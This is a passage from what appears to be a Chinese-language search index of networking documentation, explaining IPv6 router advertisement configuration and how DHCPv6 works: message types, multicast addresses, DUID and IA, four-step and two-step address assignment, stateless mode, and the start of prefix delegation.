\u62a5\u6587\u53d1\u5e03\nundo ipv6 nd ra halt\n# \u6309\u9700\u914d\u7f6e RA \u62a5\u6587\u4e2d\u643a\u5e26\u7684\u524d\u7f00\nipv6 nd ra prefix ipv6-address prefix-length valid-lifetime preferred-lifetime [ no-autoconfig ] [ off-link ]\n</code></pre>","tags":["stable"]},{"location":"operation/network/network-technology/ipv6/#dhcpv6-\u539f\u7406","title":"DHCPv6 \u539f\u7406","text":"<p>\u76ee\u524d IPv6 \u5730\u5740\u7684\u5206\u914d\u65b9\u6cd5\u6709\u4ee5\u4e0b\u51e0\u79cd\uff1a</p> <ul> <li>\u624b\u52a8\u914d\u7f6e\u3002\u624b\u52a8\u914d\u7f6e IPv6 \u5730\u5740/\u524d\u7f00\u53ca\u5176\u4ed6\u7f51\u7edc\u914d\u7f6e\u53c2\u6570\uff08DNS\u3001NIS\u3001SNTP \u670d\u52a1\u5668\u5730\u5740\u7b49\u53c2\u6570\uff09\u3002</li> <li>\u65e0\u72b6\u6001\u81ea\u52a8\u5730\u5740\u5206\u914d\u3002\u7531\u63a5\u53e3 ID \u751f\u6210\u94fe\u8def\u672c\u5730\u5730\u5740\uff0c\u518d\u6839\u636e\u8def\u7531\u901a\u544a\u62a5\u6587 RA\uff08Router Advertisement\uff09\u5305\u542b\u7684\u524d\u7f00\u4fe1\u606f\u81ea\u52a8\u914d\u7f6e\u672c\u673a\u5730\u5740\u3002</li> <li>\u6709\u72b6\u6001\u81ea\u52a8\u5730\u5740\u5206\u914d\uff0c\u5373 DHCPv6 \u65b9\u5f0f\u3002DHCPv6 \u53c8\u5206\u4e3a\u5982\u4e0b\u4e24\u79cd\uff1a<ul> <li>DHCPv6 \u6709\u72b6\u6001\u81ea\u52a8\u5206\u914d\u3002DHCPv6 \u670d\u52a1\u5668\u81ea\u52a8\u5206\u914d IPv6 \u5730\u5740/PD \u524d\u7f00\u53ca\u5176\u4ed6\u7f51\u7edc\u914d\u7f6e\u53c2\u6570\uff08DNS\u3001NIS\u3001SNTP \u670d\u52a1\u5668\u5730\u5740\u7b49\u53c2\u6570\uff09\u3002</li> <li>DHCPv6 \u65e0\u72b6\u6001\u81ea\u52a8\u5206\u914d\u3002\u4e3b\u673a IPv6 \u5730\u5740\u4ecd\u7136\u901a\u8fc7\u8def\u7531\u901a\u544a\u65b9\u5f0f\u81ea\u52a8\u751f\u6210\uff0cDHCPv6 \u670d\u52a1\u5668\u53ea\u5206\u914d\u9664 IPv6 \u5730\u5740\u4ee5\u5916\u7684\u914d\u7f6e\u53c2\u6570\uff0c\u5305\u62ec DNS\u3001NIS\u3001SNTP \u670d\u52a1\u5668\u7b49\u53c2\u6570\u3002</li> </ul> </li> </ul>","tags":["stable"]},{"location":"operation/network/network-technology/ipv6/#dhcpv6-\u57fa\u672c\u6982\u5ff5","title":"DHCPv6 \u57fa\u672c\u6982\u5ff5","text":"<ul> <li>\u7ec4\u64ad\u5730\u5740<ul> <li>\u5728 DHCPv6 \u534f\u8bae\u4e2d\uff0c\u5ba2\u6237\u7aef\u4e0d\u7528\u914d\u7f6e DHCPv6 Server \u7684 IPv6 \u5730\u5740\uff0c\u800c\u662f\u53d1\u9001\u76ee\u7684\u5730\u5740\u4e3a\u7ec4\u64ad\u5730\u5740\u7684 Solicit \u62a5\u6587\u6765\u5b9a\u4f4d DHCPv6 \u670d\u52a1\u5668\u3002</li> <li>\u5728 DHCPv4 \u534f\u8bae\u4e2d\uff0c\u5ba2\u6237\u7aef\u53d1\u9001\u5e7f\u64ad\u62a5\u6587\u6765\u5b9a\u4f4d\u670d\u52a1\u5668\u3002\u4e3a\u907f\u514d\u5e7f\u64ad\u98ce\u66b4\uff0c\u5728 IPv6 \u4e2d\uff0c\u5df2\u7ecf\u6ca1\u6709\u4e86\u5e7f\u64ad\u7c7b\u578b\u7684\u62a5\u6587\uff0c\u800c\u662f\u91c7\u7528\u7ec4\u64ad\u62a5\u6587\u3002DHCPv6 \u7528\u5230\u7684\u7ec4\u64ad\u5730\u5740\u6709\u4e24\u4e2a\uff1a<ul> <li><code>FF02::1:2</code>\uff08All DHCP Relay Agents and Servers\uff09\uff1a\u6240\u6709 DHCPv6 \u670d\u52a1\u5668\u548c\u4e2d\u7ee7\u4ee3\u7406\u7684\u7ec4\u64ad\u5730\u5740\uff0c\u8fd9\u4e2a\u5730\u5740\u662f\u94fe\u8def\u8303\u56f4\u7684\uff0c\u7528\u4e8e\u5ba2\u6237\u7aef\u548c\u76f8\u90bb\u7684\u670d\u52a1\u5668\u53ca\u4e2d\u7ee7\u4ee3\u7406\u4e4b\u95f4\u901a\u4fe1\u3002\u6240\u6709 DHCPv6 \u670d\u52a1\u5668\u548c\u4e2d\u7ee7\u4ee3\u7406\u90fd\u662f\u8be5\u7ec4\u7684\u6210\u5458\u3002</li> <li>FF05::1:3\uff08All DHCP Servers\uff09\uff1a\u6240\u6709 DHCPv6 \u670d\u52a1\u5668\u7ec4\u64ad\u5730\u5740\uff0c\u8fd9\u4e2a\u5730\u5740\u662f\u7ad9\u70b9\u8303\u56f4\u7684\uff0c\u7528\u4e8e\u4e2d\u7ee7\u4ee3\u7406\u548c\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u901a\u4fe1\uff0c\u7ad9\u70b9\u5185\u7684\u6240\u6709 DHCPv6 \u670d\u52a1\u5668\u90fd\u662f\u6b64\u7ec4\u7684\u6210\u5458\u3002</li> </ul> </li> </ul> </li> <li>UDP \u7aef\u53e3\u53f7<ul> <li>DHCPv6 \u62a5\u6587\u627f\u8f7d\u5728 UDPv6 \u4e0a\u3002</li> <li>\u5ba2\u6237\u7aef\u4fa6\u542c\u7684 UDP \u76ee\u7684\u7aef\u53e3\u53f7\u662f 546\u3002</li> <li>\u670d\u52a1\u5668\u3001\u4e2d\u7ee7\u4ee3\u7406\u4fa6\u542c\u7684 UDP \u7aef\u53e3\u53f7\u662f 547\u3002</li> </ul> </li> <li>DHCP \u552f\u4e00\u6807\u8bc6\u7b26\uff08DUID\uff09<ul> <li>DHCP \u8bbe\u5907\u552f\u4e00\u6807\u8bc6\u7b26 DUID\uff08DHCPv6 Unique Identifier\uff09\uff0c\u6bcf\u4e2a\u670d\u52a1\u5668\u6216\u5ba2\u6237\u7aef\u6709\u4e14\u53ea\u6709\u4e00\u4e2a\u552f\u4e00\u6807\u8bc6\u7b26\uff0c\u670d\u52a1\u5668\u4f7f\u7528 DUID \u6765\u8bc6\u522b\u4e0d\u540c\u7684\u5ba2\u6237\u7aef\uff0c\u5ba2\u6237\u7aef\u5219\u4f7f\u7528 DUID \u6765\u8bc6\u522b\u670d\u52a1\u5668\u3002</li> <li>\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668 DUID \u7684\u5185\u5bb9\u5206\u522b\u901a\u8fc7 DHCPv6 \u62a5\u6587\u4e2d\u7684 Client Identifier \u548c Server Identifier \u9009\u9879\u6765\u643a\u5e26\u3002\u4e24\u79cd\u9009\u9879\u7684\u683c\u5f0f\u4e00\u6837\uff0c\u901a\u8fc7 option-code \u5b57\u6bb5\u7684\u53d6\u503c\u6765\u533a\u5206\u662f Client Identifier \u8fd8\u662f Server Identifier \u9009\u9879\u3002</li> </ul> </li> <li>\u8eab\u4efd\u8054\u76df\uff08IA\uff09<ul> <li>\u8eab\u4efd\u8054\u76df IA\uff08Identity Association\uff09\u662f\u4f7f\u5f97\u670d\u52a1\u5668\u548c\u5ba2\u6237\u7aef\u80fd\u591f\u8bc6\u522b\u3001\u5206\u7ec4\u548c\u7ba1\u7406\u4e00\u7cfb\u5217\u76f8\u5173 IPv6 \u5730\u5740\u7684\u7ed3\u6784\u3002\u6bcf\u4e2a IA \u5305\u62ec\u4e00\u4e2a IAID \u548c\u76f8\u5173\u8054\u7684\u914d\u7f6e\u4fe1\u606f\u3002</li> <li>\u5ba2\u6237\u7aef\u5fc5\u987b\u4e3a\u5b83\u7684\u6bcf\u4e00\u4e2a\u8981\u901a\u8fc7\u670d\u52a1\u5668\u83b7\u53d6 IPv6 \u5730\u5740\u7684\u63a5\u53e3\u5173\u8054\u81f3\u5c11\u4e00\u4e2a IA\u3002\u5ba2\u6237\u7aef\u7528\u7ed9\u63a5\u53e3\u5173\u8054\u7684 IA \u6765\u4ece\u670d\u52a1\u5668\u83b7\u53d6\u914d\u7f6e\u4fe1\u606f\u3002\u6bcf\u4e2a IA \u5fc5\u987b\u660e\u786e\u5173\u8054\u5230\u4e00\u4e2a\u63a5\u53e3\u3002</li> <li>IA \u7684\u8eab\u4efd\u7531 IAID \u552f\u4e00\u786e\u5b9a\uff0c\u540c\u4e00\u4e2a\u5ba2\u6237\u7aef\u7684 IAID \u4e0d\u80fd\u51fa\u73b0\u91cd\u590d\u3002IAID \u4e0d\u5e94\u56e0\u4e3a\u8bbe\u5907\u7684\u91cd\u542f\u7b49\u56e0\u7d20\u53d1\u751f\u4e22\u5931\u6216\u6539\u53d8\u3002</li> <li>IA \u4e2d\u7684\u914d\u7f6e\u4fe1\u606f\u7531\u4e00\u4e2a\u6216\u591a\u4e2a IPv6 \u5730\u5740\u4ee5\u53ca T1 \u548c T2 \u751f\u5b58\u671f\u7ec4\u6210\u3002IA \u4e2d\u7684\u6bcf\u4e2a\u5730\u5740\u90fd\u6709\u9996\u9009\u751f\u5b58\u671f\u548c\u6709\u6548\u751f\u5b58\u671f\u3002</li> <li>\u4e00\u4e2a\u63a5\u53e3\u81f3\u5c11\u5173\u8054\u4e00\u4e2a IA\uff0c\u4e00\u4e2a IA \u53ef\u4ee5\u5305\u542b\u4e00\u4e2a\u6216\u591a\u4e2a\u5730\u5740\u4fe1\u606f\u3002</li> </ul> </li> </ul>","tags":["stable"]},{"location":"operation/network/network-technology/ipv6/#dhcpv6-\u62a5\u6587\u683c\u5f0f","title":"DHCPv6 \u62a5\u6587\u683c\u5f0f","text":"<p>\u76ee\u524d DHCPv6 \u5b9a\u4e49\u4e86\u5982\u4e0b\u5341\u4e09\u79cd\u7c7b\u578b\u62a5\u6587\uff0cDHCPv6 \u670d\u52a1\u5668\u548c DHCPv6 \u5ba2\u6237\u7aef\u4e4b\u95f4\u901a\u8fc7\u8fd9\u5341\u4e09\u79cd\u7c7b\u578b\u7684\u62a5\u6587\u8fdb\u884c\u901a\u4fe1\u3002\u4e0b\u8868\u5bf9 DHCPv6 \u548c DHCPv4 \u62a5\u6587\u8fdb\u884c\u4e86\u7c7b\u6bd4\u3002</p> \u62a5\u6587\u7c7b\u578b DHCPv6 \u62a5\u6587 DHCPv4 \u62a5\u6587 \u8bf4\u660e 1 SOLICIT DHCP DISCOVER DHCPv6 \u5ba2\u6237\u7aef\u4f7f\u7528 Solicit \u62a5\u6587\u6765\u786e\u5b9a DHCPv6 \u670d\u52a1\u5668\u7684\u4f4d\u7f6e\u3002 2 ADVERTISE DHCP OFFER DHCPv6 \u670d\u52a1\u5668\u53d1\u9001 Advertise \u62a5\u6587\u6765\u5bf9 Solicit \u62a5\u6587\u8fdb\u884c\u56de\u5e94\uff0c\u5ba3\u544a\u81ea\u5df1\u80fd\u591f\u63d0\u4f9b DHCPv6 \u670d\u52a1\u3002 3 REQUEST DHCP REQUEST DHCPv6 \u5ba2\u6237\u7aef\u53d1\u9001 Request \u62a5\u6587\u6765\u5411 DHCPv6 \u670d\u52a1\u5668\u8bf7\u6c42 IPv6 \u5730\u5740\u548c\u5176\u5b83\u914d\u7f6e\u4fe1\u606f\u3002 4 CONFIRM - DHCPv6 \u5ba2\u6237\u7aef\u5411\u4efb\u610f\u53ef\u8fbe\u7684 DHCPv6 \u670d\u52a1\u5668\u53d1\u9001 Confirm \u62a5\u6587\u68c0\u67e5\u81ea\u5df1\u76ee\u524d\u83b7\u5f97\u7684 IPv6 \u5730\u5740\u662f\u5426\u9002\u7528\u4e0e\u5b83\u6240\u8fde\u63a5\u7684\u94fe\u8def\u3002 5 RENEW DHCP REQUEST DHCPv6 \u5ba2\u6237\u7aef\u5411\u7ed9\u5176\u63d0\u4f9b\u5730\u5740\u548c\u914d\u7f6e\u4fe1\u606f\u7684 DHCPv6 \u670d\u52a1\u5668\u53d1\u9001 Renew \u62a5\u6587\u6765\u5ef6\u957f\u5730\u5740\u7684\u751f\u5b58\u671f\u5e76\u66f4\u65b0\u914d\u7f6e\u4fe1\u606f\u3002 6 REBIND DHCP REQUEST \u5982\u679c Renew \u62a5\u6587\u6ca1\u6709\u5f97\u5230\u5e94\u7b54\uff0cDHCPv6 \u5ba2\u6237\u7aef\u5411\u4efb\u610f\u53ef\u8fbe\u7684 DHCPv6 \u670d\u52a1\u5668\u53d1\u9001 Rebind \u62a5\u6587\u6765\u5ef6\u957f\u5730\u5740\u7684\u751f\u5b58\u671f\u5e76\u66f4\u65b0\u914d\u7f6e\u4fe1\u606f\u3002 7 REPLY DHCP ACK/NAK DHCPv6 \u670d\u52a1\u5668\u5728\u4ee5\u4e0b\u573a\u5408\u53d1\u9001 Reply \u62a5\u6587\uff1aDHCPv6 \u670d\u52a1\u5668\u53d1\u9001\u643a\u5e26\u4e86\u5730\u5740\u548c\u914d\u7f6e\u4fe1\u606f\u7684 Reply \u6d88\u606f\u6765\u56de\u5e94\u4ece DHCPv6 \u5ba2\u6237\u7aef\u6536\u5230\u7684 Solicit\u3001Request\u3001Renew\u3001Rebind \u62a5\u6587\u3002DHCPv6 \u670d\u52a1\u5668\u53d1\u9001\u643a\u5e26\u914d\u7f6e\u4fe1\u606f\u7684 Reply \u6d88\u606f\u6765\u56de\u5e94\u6536\u5230\u7684 Information-Request \u62a5\u6587\u3002\u7528\u6765\u56de\u5e94 DHCPv6 \u5ba2\u6237\u7aef\u53d1\u6765\u7684 Confirm\u3001Release\u3001Decline \u62a5\u6587\u3002 8 RELEASE DHCP RELEASE DHCPv6 \u5ba2\u6237\u7aef\u5411\u4e3a\u5176\u5206\u914d\u5730\u5740\u7684 DHCPv6 \u670d\u52a1\u5668\u53d1\u9001 Release \u62a5\u6587\uff0c\u8868\u660e\u81ea\u5df1\u4e0d\u518d\u4f7f\u7528\u4e00\u4e2a\u6216\u591a\u4e2a\u83b7\u53d6\u7684\u5730\u5740\u3002 9 DECLINE DHCP DECLINE DHCPv6 \u5ba2\u6237\u7aef\u5411 DHCPv6 \u670d\u52a1\u5668\u53d1\u9001 Decline \u62a5\u6587\uff0c\u58f0\u660e DHCPv6 \u670d\u52a1\u5668\u5206\u914d\u7684\u4e00\u4e2a\u6216\u591a\u4e2a\u5730\u5740\u5728 DHCPv6 \u5ba2\u6237\u7aef\u6240\u5728\u94fe\u8def\u4e0a\u5df2\u7ecf\u88ab\u4f7f\u7528\u4e86\u3002 10 RECONFIGURE - DHCPv6 \u670d\u52a1\u5668\u5411 DHCPv6 \u5ba2\u6237\u7aef\u53d1\u9001 Reconfigure \u62a5\u6587\uff0c\u7528\u4e8e\u63d0\u793a DHCPv6 \u5ba2\u6237\u7aef\uff0c\u5728 DHCPv6 \u670d\u52a1\u5668\u4e0a\u5b58\u5728\u65b0\u7684\u7f51\u7edc\u914d\u7f6e\u4fe1\u606f\u3002 11 INFORMATION-REQUEST DHCP INFORM DHCPv6 \u5ba2\u6237\u7aef\u5411 DHCPv6 \u670d\u52a1\u5668\u53d1\u9001 Information-Request \u62a5\u6587\u6765\u8bf7\u6c42\u9664 IPv6 \u5730\u5740\u4ee5\u5916\u7684\u7f51\u7edc\u914d\u7f6e\u4fe1\u606f\u3002 12 RELAY-FORW - \u4e2d\u7ee7\u4ee3\u7406\u901a\u8fc7 Relay-Forward \u62a5\u6587\u6765\u5411 DHCPv6 \u670d\u52a1\u5668\u8f6c\u53d1 DHCPv6 \u5ba2\u6237\u7aef\u8bf7\u6c42\u62a5\u6587\u3002 13 RELAY-REPL - DHCPv6 \u670d\u52a1\u5668\u5411\u4e2d\u7ee7\u4ee3\u7406\u53d1\u9001 Relay-Reply \u62a5\u6587\uff0c\u5176\u4e2d\u643a\u5e26\u4e86\u8f6c\u53d1\u7ed9 DHCPv6 \u5ba2\u6237\u7aef\u7684\u62a5\u6587\u3002","tags":["stable"]},{"location":"operation/network/network-technology/ipv6/#dhcpv6-\u6709\u72b6\u6001\u81ea\u52a8\u5206\u914d","title":"DHCPv6 \u6709\u72b6\u6001\u81ea\u52a8\u5206\u914d","text":"<p>IPv6 \u4e3b\u673a\u901a\u8fc7\u6709\u72b6\u6001 DHCPv6 \u65b9\u5f0f\u83b7\u53d6 IPv6 \u5730\u5740\u548c\u5176\u4ed6\u914d\u7f6e\u53c2\u6570\uff08\u4f8b\u5982 DNS \u670d\u52a1\u5668\u7684 IPv6 \u5730\u5740\u7b49\uff09\u3002</p> <p>DHCPv6 \u670d\u52a1\u5668\u4e3a\u5ba2\u6237\u7aef\u5206\u914d\u5730\u5740/\u524d\u7f00\u7684\u8fc7\u7a0b\u5206\u4e3a\u4e24\u7c7b\uff1a</p> <ul> <li>DHCPv6 \u56db\u6b65\u4ea4\u4e92\u5206\u914d\u8fc7\u7a0b</li> <li>DHCPv6 \u4e24\u6b65\u4ea4\u4e92\u5feb\u901f\u5206\u914d\u8fc7\u7a0b</li> </ul>","tags":["stable"]},{"location":"operation/network/network-technology/ipv6/#dhcpv6-\u56db\u6b65\u4ea4\u4e92","title":"DHCPv6 \u56db\u6b65\u4ea4\u4e92","text":"<p>\u56db\u6b65\u4ea4\u4e92\u5e38\u7528\u4e8e\u7f51\u7edc\u4e2d\u6709\u591a\u4e2a DHCPv6 \u670d\u52a1\u5668\u7684\u60c5\u51b5\u3002DHCPv6 \u5ba2\u6237\u7aef\u9996\u5148\u901a\u8fc7\u7ec4\u64ad\u53d1\u9001 Solicit \u62a5\u6587\u6765\u5b9a\u4f4d\u53ef\u4ee5\u4e3a\u5176\u63d0\u4f9b\u670d\u52a1\u7684 DHCPv6 \u670d\u52a1\u5668\uff0c\u5728\u6536\u5230\u591a\u4e2a DHCPv6 \u670d\u52a1\u5668\u7684 Advertise \u62a5\u6587\u540e\uff0c\u6839\u636e DHCPv6 \u670d\u52a1\u5668\u7684\u4f18\u5148\u7ea7\u9009\u62e9\u4e00\u4e2a\u4e3a\u5176\u5206\u914d\u5730\u5740\u548c\u914d\u7f6e\u4fe1\u606f\u7684\u670d\u52a1\u5668\uff0c\u63a5\u7740\u901a\u8fc7 Request/Reply \u62a5\u6587\u4ea4\u4e92\u5b8c\u6210\u5730\u5740\u7533\u8bf7\u548c\u5206\u914d\u8fc7\u7a0b\u3002</p> <p>DHCPv6 \u670d\u52a1\u5668\u7aef\u5982\u679c\u6ca1\u6709\u914d\u7f6e\u4f7f\u80fd\u4e24\u6b65\u4ea4\u4e92\uff0c\u65e0\u8bba\u5ba2\u6237\u7aef\u62a5\u6587\u4e2d\u662f\u5426\u5305\u542b Rapid Commit \u9009\u9879\uff0c\u670d\u52a1\u5668\u90fd\u91c7\u7528\u56db\u6b65\u4ea4\u4e92\u65b9\u5f0f\u4e3a\u5ba2\u6237\u7aef\u5206\u914d\u5730\u5740\u548c\u914d\u7f6e\u4fe1\u606f\u3002</p>      DHCPv6 \u56db\u6b65\u4ea4\u4e92\u5730\u5740\u5206\u914d\u8fc7\u7a0b      <p>DHCPv6 \u56db\u6b65\u4ea4\u4e92\u5730\u5740\u5206\u914d\u8fc7\u7a0b\u5982\u4e0b\uff1a</p> <ol> <li>DHCPv6 \u5ba2\u6237\u7aef\u53d1\u9001 Solicit \u62a5\u6587\uff0c\u8bf7\u6c42 DHCPv6 \u670d\u52a1\u5668\u4e3a\u5176\u5206\u914d IPv6 \u5730\u5740\u548c\u7f51\u7edc\u914d\u7f6e\u53c2\u6570\u3002</li> <li>\u5982\u679c Solicit \u62a5\u6587\u4e2d\u6ca1\u6709\u643a\u5e26 Rapid Commit \u9009\u9879\uff0c\u6216 Solicit \u62a5\u6587\u4e2d\u643a\u5e26 Rapid Commit \u9009\u9879\uff0c\u4f46\u670d\u52a1\u5668\u4e0d\u652f\u6301\u5feb\u901f\u5206\u914d\u8fc7\u7a0b\uff0c\u5219 DHCPv6 \u670d\u52a1\u5668\u56de\u590d Advertise \u62a5\u6587\uff0c\u901a\u77e5\u5ba2\u6237\u7aef\u53ef\u4ee5\u4e3a\u5176\u5206\u914d\u7684\u5730\u5740\u548c\u7f51\u7edc\u914d\u7f6e\u53c2\u6570\u3002</li> <li>\u5982\u679c DHCPv6 \u5ba2\u6237\u7aef\u63a5\u6536\u5230\u591a\u4e2a\u670d\u52a1\u5668\u56de\u590d\u7684 Advertise \u62a5\u6587\uff0c\u5219\u6839\u636e Advertise \u62a5\u6587\u4e2d\u7684\u670d\u52a1\u5668\u4f18\u5148\u7ea7\u7b49\u53c2\u6570\uff0c\u9009\u62e9\u4f18\u5148\u7ea7\u6700\u9ad8\u7684\u4e00\u53f0\u670d\u52a1\u5668\uff0c\u5e76\u5411\u6240\u6709\u7684\u670d\u52a1\u5668\u53d1\u9001 Request \u7ec4\u64ad\u62a5\u6587\uff0c\u8be5\u62a5\u6587\u4e2d\u643a\u5e26\u5df2\u9009\u62e9\u7684 DHCPv6 \u670d\u52a1\u5668\u7684 DUID\u3002</li> <li>DHCPv6 \u670d\u52a1\u5668\u56de\u590d Reply \u62a5\u6587\uff0c\u786e\u8ba4\u5c06\u5730\u5740\u548c\u7f51\u7edc\u914d\u7f6e\u53c2\u6570\u5206\u914d\u7ed9\u5ba2\u6237\u7aef\u4f7f\u7528\u3002</li> </ol>","tags":["stable"]},{"location":"operation/network/network-technology/ipv6/#dhcpv6-\u4e24\u6b65\u4ea4\u4e92","title":"DHCPv6 \u4e24\u6b65\u4ea4\u4e92","text":"<p>\u4e24\u6b65\u4ea4\u4e92\u5e38\u7528\u4e8e\u7f51\u7edc\u4e2d\u53ea\u6709\u4e00\u4e2a DHCPv6 \u670d\u52a1\u5668\u7684\u60c5\u51b5\u3002DHCPv6 \u5ba2\u6237\u7aef\u9996\u5148\u901a\u8fc7\u7ec4\u64ad\u53d1\u9001 Solicit \u62a5\u6587\u6765\u5b9a\u4f4d\u53ef\u4ee5\u4e3a\u5176\u63d0\u4f9b\u670d\u52a1\u7684 DHCPv6 \u670d\u52a1\u5668\uff0cDHCPv6 \u670d\u52a1\u5668\u6536\u5230\u5ba2\u6237\u7aef\u7684 Solicit \u62a5\u6587\u540e\uff0c\u4e3a\u5176\u5206\u914d\u5730\u5740\u548c\u914d\u7f6e\u4fe1\u606f\uff0c\u76f4\u63a5\u56de\u5e94 Reply \u62a5\u6587\uff0c\u5b8c\u6210\u5730\u5740\u7533\u8bf7\u548c\u5206\u914d\u8fc7\u7a0b\u3002</p> <p>\u4e24\u6b65\u4ea4\u6362\u53ef\u4ee5\u63d0\u9ad8 DHCPv6 \u8fc7\u7a0b\u7684\u6548\u7387\uff0c\u4f46\u5728\u6709\u591a\u4e2a DHCPv6 \u670d\u52a1\u5668\u7684\u7f51\u7edc\u4e2d\uff0c\u591a\u4e2a DHCPv6 \u670d\u52a1\u5668\u90fd\u53ef\u4ee5\u4e3a DHCPv6 \u5ba2\u6237\u7aef\u5206\u914d IPv6 \u5730\u5740\uff0c\u56de\u5e94 Reply \u62a5\u6587\uff0c\u4f46\u662f\u5ba2\u6237\u7aef\u5b9e\u9645\u53ea\u53ef\u80fd\u4f7f\u7528\u5176\u4e2d\u4e00\u4e2a\u670d\u52a1\u5668\u4e3a\u5176\u5206\u914d\u7684 IPv6 \u5730\u5740\u548c\u914d\u7f6e\u4fe1\u606f\u3002\u4e3a\u4e86\u9632\u6b62\u8fd9\u79cd\u60c5\u51b5\u7684\u53d1\u751f\uff0c\u7ba1\u7406\u5458\u53ef\u4ee5\u914d\u7f6e DHCPv6 \u670d\u52a1\u5668\u662f\u5426\u652f\u6301\u4e24\u6b65\u4ea4\u4e92\u5730\u5740\u5206\u914d\u65b9\u5f0f\u3002</p> <ul> <li>DHCPv6 \u670d\u52a1\u5668\u7aef\u5982\u679c\u914d\u7f6e\u4f7f\u80fd\u4e86\u4e24\u6b65\u4ea4\u4e92\uff0c\u5e76\u4e14\u5ba2\u6237\u7aef\u62a5\u6587\u4e2d\u4e5f\u5305\u542b Rapid Commit \u9009\u9879\uff0c\u670d\u52a1\u5668\u91c7\u7528\u4e24\u6b65\u4ea4\u4e92\u65b9\u5f0f\u4e3a\u5ba2\u6237\u7aef\u5206\u914d\u5730\u5740\u548c\u914d\u7f6e\u4fe1\u606f\u3002</li> <li>\u5982\u679c DHCPv6 \u670d\u52a1\u5668\u4e0d\u652f\u6301\u5feb\u901f\u5206\u914d\u5730\u5740\uff0c\u5219\u91c7\u7528\u56db\u6b65\u4ea4\u4e92\u65b9\u5f0f\u4e3a\u5ba2\u6237\u7aef\u5206\u914d IPv6 \u5730\u5740\u548c\u5176\u4ed6\u7f51\u7edc\u914d\u7f6e\u53c2\u6570\u3002</li> </ul>      DHCPv6 \u4e24\u6b65\u4ea4\u4e92\u5730\u5740\u5206\u914d\u8fc7\u7a0b      <p>DHCPv6 \u4e24\u6b65\u4ea4\u4e92\u5730\u5740\u5206\u914d\u8fc7\u7a0b\u5982\u4e0b\uff1a</p> <ol> <li>DHCPv6 \u5ba2\u6237\u7aef\u5728\u53d1\u9001\u7684 Solicit \u62a5\u6587\u4e2d\u643a\u5e26 Rapid Commit \u9009\u9879\uff0c\u6807\u8bc6\u5ba2\u6237\u7aef\u5e0c\u671b\u670d\u52a1\u5668\u80fd\u591f\u5feb\u901f\u4e3a\u5176\u5206\u914d\u5730\u5740\u548c\u7f51\u7edc\u914d\u7f6e\u53c2\u6570\u3002</li> <li>DHCPv6 \u670d\u52a1\u5668\u63a5\u6536\u5230 Solicit \u62a5\u6587\u540e\uff0c\u5c06\u8fdb\u884c\u5982\u4e0b\u5904\u7406\uff1a</li> <li>\u5982\u679c DHCPv6 \u670d\u52a1\u5668\u652f\u6301\u5feb\u901f\u5206\u914d\u5730\u5740\uff0c\u5219\u76f4\u63a5\u8fd4\u56de Reply \u62a5\u6587\uff0c\u4e3a\u5ba2\u6237\u7aef\u5206\u914d IPv6 \u5730\u5740\u548c\u5176\u4ed6\u7f51\u7edc\u914d\u7f6e\u53c2\u6570\uff0cReply \u62a5\u6587\u4e2d\u4e5f\u643a\u5e26 Rapid Commit \u9009\u9879\u3002</li> <li>\u5982\u679c DHCPv6 \u670d\u52a1\u5668\u4e0d\u652f\u6301\u5feb\u901f\u5206\u914d\u8fc7\u7a0b\uff0c\u5219\u91c7\u7528\u56db\u6b65\u4ea4\u4e92\u65b9\u5f0f\u4e3a\u5ba2\u6237\u7aef\u5206\u914d IPv6 \u5730\u5740/\u524d\u7f00\u548c\u5176\u4ed6\u7f51\u7edc\u914d\u7f6e\u53c2\u6570\u3002</li> </ol>","tags":["stable"]},{"location":"operation/network/network-technology/ipv6/#dhcpv6-\u65e0\u72b6\u6001\u81ea\u52a8\u5206\u914d","title":"DHCPv6 \u65e0\u72b6\u6001\u81ea\u52a8\u5206\u914d","text":"<p>IPv6 \u8282\u70b9\u53ef\u4ee5\u901a\u8fc7 DHCPv6 \u65e0\u72b6\u6001\u65b9\u5f0f\u83b7\u53d6\u914d\u7f6e\u53c2\u6570\uff08\u5305\u62ec DNS\u3001SIP\u3001SNTP \u7b49\u670d\u52a1\u5668\u914d\u7f6e\u4fe1\u606f\uff0c\u4e0d\u5305\u62ec IPv6 \u5730\u5740\uff09\u3002</p>      DHCPv6 \u65e0\u72b6\u6001\u81ea\u52a8\u5206\u914d\u8fc7\u7a0b      <p>DHCPv6 \u65e0\u72b6\u6001\u5de5\u4f5c\u8fc7\u7a0b\u5982\u4e0b\uff1a</p> <ol> <li>DHCPv6 \u5ba2\u6237\u7aef\u4ee5\u7ec4\u64ad\u65b9\u5f0f\u5411 DHCPv6 \u670d\u52a1\u5668\u53d1\u9001 Information-Request \u62a5\u6587\uff0c\u8be5\u62a5\u6587\u4e2d\u643a\u5e26 Option Request \u9009\u9879\uff0c\u6307\u5b9a DHCPv6 \u5ba2\u6237\u7aef\u9700\u8981\u4ece DHCPv6 \u670d\u52a1\u5668\u83b7\u53d6\u7684\u914d\u7f6e\u53c2\u6570\u3002</li> <li>DHCPv6 \u670d\u52a1\u5668\u6536\u5230 Information-Request \u62a5\u6587\u540e\uff0c\u4e3a DHCPv6 \u5ba2\u6237\u7aef\u5206\u914d\u7f51\u7edc\u914d\u7f6e\u53c2\u6570\uff0c\u5e76\u5355\u64ad\u53d1\u9001 Reply \u62a5\u6587\uff0c\u5c06\u7f51\u7edc\u914d\u7f6e\u53c2\u6570\u8fd4\u56de\u7ed9 DHCPv6 \u5ba2\u6237\u7aef\u3002DHCPv6 \u5ba2\u6237\u7aef\u6839\u636e\u6536\u5230 Reply \u62a5\u6587\u63d0\u4f9b\u7684\u53c2\u6570\u5b8c\u6210 DHCPv6 \u5ba2\u6237\u7aef\u65e0\u72b6\u6001\u914d\u7f6e\u3002</li> </ol>","tags":["stable"]},{"location":"operation/network/network-technology/ipv6/#dhcpv6-pd-\u5de5\u4f5c\u539f\u7406","title":"DHCPv6 PD \u5de5\u4f5c\u539f\u7406","text":"<p>DHCPv6 \u524d\u7f00\u4ee3\u7406 DHCPv6 PD(Prefix Delegation) \u662f\u4e00\u79cd\u524d\u7f00\u5206\u914d\u673a\u5236\uff0c\u5e76\u5728 RFC3633 \u4e2d\u5f97\u4ee5\u6807\u51c6\u5316\u3002\u5728\u4e00\u4e2a\u5c42\u6b21\u5316\u7684\u7f51\u7edc\u62d3\u6251\u7ed3\u6784\u4e2d\uff0c\u4e0d\u540c\u5c42\u6b21\u7684 IPv6 \u5730\u5740\u5206\u914d\u4e00\u822c\u662f\u624b\u5de5\u6307\u5b9a\u7684\u3002\u624b\u5de5\u914d\u7f6e IPv6 